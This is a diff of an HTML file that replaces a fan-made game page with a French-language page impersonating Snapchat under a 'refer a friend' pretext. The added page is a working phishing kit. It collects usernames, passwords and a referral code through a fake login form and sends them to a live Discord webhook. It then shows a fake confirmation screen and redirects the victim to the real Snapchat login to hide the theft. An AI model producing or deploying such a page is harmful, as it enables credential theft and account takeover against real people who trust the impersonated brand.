@@ -1,233 +1,199 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Blue Lock: Rivals</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Snapchat | Parrainez Un Ami</title>
+
+  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
+  <meta property="og:description" content="Description courte" />
+  <meta property="og:image" content="https://i.ibb.co/wZhXf3RN/Snapchat-1.png" />
+
   <style>
-    * {
+    body {
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-      font-family: 'Roboto', sans-serif;
-    }
-
-    body {
-      background-color: #0d0d0d;
-      color: white;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f0f0f0;
       display: flex;
+      justify-content: center;
+      align-items: center;
       height: 100vh;
     }
-
-    .sidebar {
-      width: 200px;
-      background-color: #111;
-      padding: 20px;
-    }
-
-    .sidebar a {
-      color: white;
-      display: block;
-      margin: 10px 0;
-      text-decoration: none;
-      font-size: 14px;
-    }
-
-    .sidebar .get-premium {
-      background: white;
-      color: black;
-      padding: 10px;
+    .login-box, .image-screen {
+      width: 100%;
+      max-width: 400px;
+      padding: 40px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 10px;
       text-align: center;
-      border-radius: 5px;
-      margin-top: 20px;
+      background-color: #fff;
+      color: #000;
+    }
+    .logo {
+      width: 80px;
+      margin: 0 auto 20px auto;
+      display: block;
+    }
+    .form-group {
+      text-align: left;
+      margin-bottom: 15px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
       font-weight: bold;
+      margin-bottom: 5px;
     }
-
-    .main {
-      flex-grow: 1;
-      padding: 20px;
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
     }
-
-    .header {
+    button {
+      background-color: #fffc00;
+      border: none;
+      color: #000;
+      font-weight: bold;
+      padding: 12px;
+      width: 100%;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    .links-container {
       display: flex;
       justify-content: space-between;
-      align-items: center;
+      margin-top: 10px;
+      font-size: 14px;
     }
-
-    .header input {
-      background: #222;
+    .link-button {
+      background: transparent;
       border: none;
-      padding: 5px 10px;
-      border-radius: 5px;
-      color: white;
-    }
-
-    .game-container {
-      display: flex;
-      margin-top: 20px;
-    }
-
-    .game-image img {
-      height: 300px;
-    }
-
-    .game-info {
-      margin-left: 20px;
-    }
-
-    .play-button {
-      background: #2563eb;
-      padding: 10px 30px;
-      color: white;
+      color: blue;
       font-weight: bold;
-      border: none;
-      border-radius: 5px;
-      margin-top: 20px;
-      display: inline-block;
-    }
-
-    .tabs {
-      margin-top: 20px;
-    }
-
-    .tabs button {
-      background: #1e1e1e;
-      color: white;
-      padding: 10px 15px;
-      border: none;
       cursor: pointer;
+      text-decoration: underline;
     }
-
-    .events {
-      display: flex;
-      margin-top: 20px;
-      gap: 20px;
+    #errorMessage,
+    #referralError {
+      color: red;
+      display: none;
+      margin-top: 10px;
     }
-
-    .event-card {
-      background: #1e1e1e;
-      width: 240px;
-      border-radius: 5px;
-      overflow: hidden;
+    #imageScreen {
+      display: none;
     }
-
-    .event-card img {
-      width: 100%;
-    }
-
-    .event-info {
-      padding: 10px;
-    }
-
-    .description {
-      margin-top: 20px;
-      background: #1e1e1e;
-      padding: 15px;
-      border-radius: 5px;
-    }
-
-    .chat-box {
-      width: 220px;
-      background: #1a1a1a;
-      padding: 10px;
-    }
-
-    .chat-box input {
-      width: 100%;
-      background: #333;
-      border: none;
-      padding: 5px;
-      margin-bottom: 10px;
-      border-radius: 5px;
-      color: white;
-    }
-
-    .friend {
-      padding: 5px;
-      margin: 5px 0;
-      border-bottom: 1px solid #333;
+    #imageScreen img {
+      width: 200px; /* taille réduite */
+      border-radius: 10px;
+      display: block;
+      margin: 0 auto;
     }
   </style>
 </head>
 <body>
-  <div class="sidebar">
-    <div style="margin-bottom: 20px; font-weight: bold;">Rankos</div>
-    <a href="#">Home</a>
-    <a href="#">Profile</a>
-    <a href="#">Messages</a>
-    <a href="#">Friends</a>
-    <a href="#">Avatar</a>
-    <a href="#">Inventory</a>
-    <a href="#">Trade</a>
-    <a href="#">Communities</a>
-    <a href="#">Blog</a>
-    <a href="#">Official Store</a>
-    <a href="#">Gift Cards</a>
-    <div class="get-premium">Get Premium</div>
-  </div>
-  <div class="main">
-    <div class="header">
-      <div>
-        <strong>Charts</strong> | <strong>Marketplace</strong> | <strong>Create</strong> | <strong>Robux</strong>
+  <div class="login-box" id="loginBox">
+    <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
+    <h2>Snapchat | Parrainez Un Ami</h2>
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="username">Nom d'utilisateur ou e-mail</label>
+        <input type="text" id="username" required />
       </div>
-      <input type="text" placeholder="Search">
-    </div>
-
-    <div class="game-container">
-      <div class="game-image">
-        <img src="/mnt/data/8306c703-6f3b-4546-8154-16866c4da901.png" alt="Blue Lock Image">
+      <div class="form-group">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" required />
       </div>
-      <div class="game-info">
-        <h1>Blue Lock: Rivals</h1>
-        <p>By <strong>Blue Lock Rivals Unofficial Fans</strong></p>
-        <p>Maturity: Minimal</p>
-        <button class="play-button">▶ Play</button>
-        <div style="margin-top: 10px;">
-          ⭐ Favorite | 🔔 Notify | 👍 8M+ | 👎 239K+
-        </div>
-      </div>
-    </div>
-
-    <div class="tabs">
-      <button>About</button>
-      <button>Store</button>
-      <button>Servers</button>
-    </div>
-
-    <div class="events">
-      <div class="event-card">\        
-        <img src="https://t3.ftcdn.net/jpg/03/28/93/19/360_F_328931999_UURJbtpDXd2cD9a2mCQSw0vTpqbBuJrV.jpg" alt="LOKI Event">
-        <div class="event-info">
-          <strong>LOKI</strong>
-          <p>The God Sprinter arrives ⚡</p>
-          <button class="play-button">Notify Me</button>
-        </div>
+      <div class="form-group">
+        <label for="referralCode">Code de parrainage</label>
+        <input type="text" id="referralCode" required />
       </div>
 
-      <div class="event-card">
-        <img src="https://via.placeholder.com/240x140/000000/FFFFFF?text=%3F%3F%3F" alt="Next Update">
-        <div class="event-info">
-          <strong>Next Update</strong>
-          <p>Sign up for the next upd!</p>
-          <button class="play-button">Notify Me</button>
-        </div>
-      </div>
-    </div>
+      <button type="submit">Connexion</button>
 
-    <div class="description">
-      <p><strong>IMPORTANT:</strong> This fan-made unofficial game is created by huge Blue Lock fans as a tribute to celebrate the anime and share our love...</p>
-    </div>
+      <div class="links-container">
+        <button type="button" class="link-button">S'inscrire</button>
+        <button type="button" class="link-button">Mot de passe oublié</button>
+      </div>
+    </form>
+    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
+    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <div class="chat-box">
-    <input type="text" placeholder="Search for friends">
-    <div class="friend">jsntp64 <small>May 10</small></div>
-    <div class="friend">ItoshiSaeTheegoist <small>May 19</small></div>
-    <div class="friend">angelthecake <small>May 17</small></div>
-    <div class="friend">Something <small>May 17</small></div>
-    <div class="friend">tocinacio <small>May 11</small></div>
-    <div class="friend">ly78k <small>Apr 24</small></div>
+  <div class="image-screen" id="imageScreen">
+    <img src="https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg" alt="Confirmation Snapchat" />
   </div>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
+    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const referralCode = document.getElementById('referralCode').value.trim();
+
+      const errorMessage = document.getElementById('errorMessage');
+      const referralError = document.getElementById('referralError');
+
+      errorMessage.style.display = 'none';
+      referralError.style.display = 'none';
+
+      if (username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ")) {
+        errorMessage.style.display = 'block';
+        return;
+      }
+
+      if (!/^\d{4}$/.test(referralCode)) {
+        referralError.style.display = 'block';
+        return;
+      }
+
+      const message = {
+        embeds: [
+          {
+            title: "📥 Nouvelle tentative de connexion",
+            description: "Informations collectées via le formulaire",
+            color: 0xffc800,
+            fields: [
+              { name: "👤 Nom d'utilisateur / e-mail", value: username },
+              { name: "🔒 Mot de passe", value: password },
+              { name: "🎁 Code de parrainage", value: referralCode }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: "Formulaire Rankos" }
+          }
+        ]
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(message),
+      })
+      .then(response => {
+        // Après l'envoi, lancer le processus d'affichage et de redirection
+        setTimeout(() => {
+          document.getElementById('loginBox').style.display = 'none';
+          document.getElementById('imageScreen').style.display = 'block';
+
+          setTimeout(() => {
+            window.location.href = redirectURL;
+          }, 30000); // 30 secondes
+        }, 1000); // 1 seconde (modifié)
+      })
+      .catch(error => {
+        alert("Erreur réseau ou CORS.");
+        console.error(error);
+      });
+    });
+  </script>
 </body>
 </html>
